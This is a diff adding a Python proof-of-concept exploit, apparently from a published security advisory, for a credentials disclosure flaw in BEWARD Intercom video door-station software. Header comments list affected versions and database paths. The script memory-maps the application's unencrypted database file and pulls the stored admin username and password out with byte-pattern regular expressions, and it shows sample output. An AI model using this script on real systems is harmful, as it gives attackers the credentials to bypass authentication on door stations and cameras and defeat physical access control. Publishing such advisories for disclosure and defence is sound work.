@@ -1,0 +1,88 @@
+#!/usr/bin/env python
+# -*- coding: utf8 -*-
+#
+# BEWARD Intercom 2.3.1 Credentials Disclosure
+#
+#
+# Vendor: Beward R&D Co., Ltd
+# Product web page: https://www.beward.net
+# Affected version: 2.3.1.34471
+#                   2.3.0
+#                   2.2.11
+#                   2.2.10.5
+#                   2.2.9
+#                   2.2.8.9
+#                   2.2.7.4
+#
+# Note: For versions above 2.2.11: The application data directory, which
+# stores logs, settings and the call records archive, was moved to ProgramData\BEWARD.
+#
+# New versions: C:\ProgramData\BEWARD\BEWARD Intercom\DB\BEWARD.INTERCOM.FDB
+# Old versions: C:\Users\%username%\AppData\Local\Beward R&D Co., Ltd\BEWARD Intercom\DB\BEWARD.INTERCOM.FDB
+#
+# Summary: Multiaccessible User Operation, Electronic Lock Control, Real-Time
+# Video, Two-Way Audio. The software is used for BEWARD IP video door stations
+# control.
+#
+# Desc: The application stores logs and sensitive information in an unencrypted
+# binary file called BEWARD.INTERCOM.FDB. A local attacker that has access to
+# the current user session can successfully disclose plain-text credentials that
+# can be used to bypass authentication to the affected IP camera and door station
+# and bypass access control in place.
+#
+# Tested on: Microsoft Windows 10 Home (EN)
+#            Microsoft Windows 7 SP1 (EN)
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2019-5505
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5505.php
+#
+#
+#
+#######################################################################
+# Output:
+# --------
+# C:\> python beward_creds.py
+# Username: admin
+# Password: S3cr3tP4$$w0rd
+# C:\> 
+#
+#######################################################################
+#
+# 28.11.2018
+#
+
+import subprocess
+import mmap######
+import re########
+import os########
+
+#
+# For versions bellow 2.2.11:
+#
+# cuser = subprocess.check_output("echo %username%", shell=True)
+# dbfile = ('C:\Users\\' + cuser.rstrip() + '\Ap'
+#           'pData\Local\Beward R&D Co., Ltd\BEW'
+#           'ARD Intercom\DB\BEWARD.INTERCOM.FDB'
+#          )
+#
+
+#
+# For versions 2.2.11 and above:
+#
+
+dbfile = 'C:\ProgramData\BEWARD\BEWARD Intercom\DB\BEWARD.INTERCOM.FDB'
+
+def mapfile(filename):
+    file = open(filename, "r+")
+    size = os.path.getsize(filename)
+    return mmap.mmap(file.fileno(), size)
+
+data = mapfile(dbfile)
+m = re.search(r"\xF7\x00\x07\x05\x00(.*?)\xD3\x00\x0E\x0C\x00", data)
+print "Username: " + m.group(1)
+m = re.search(r"\xD3\x00\x0E\x0C\x00(.*?)\xDA\x00\x11\x0F\x00", data)
+print "Password: " + m.group(1)
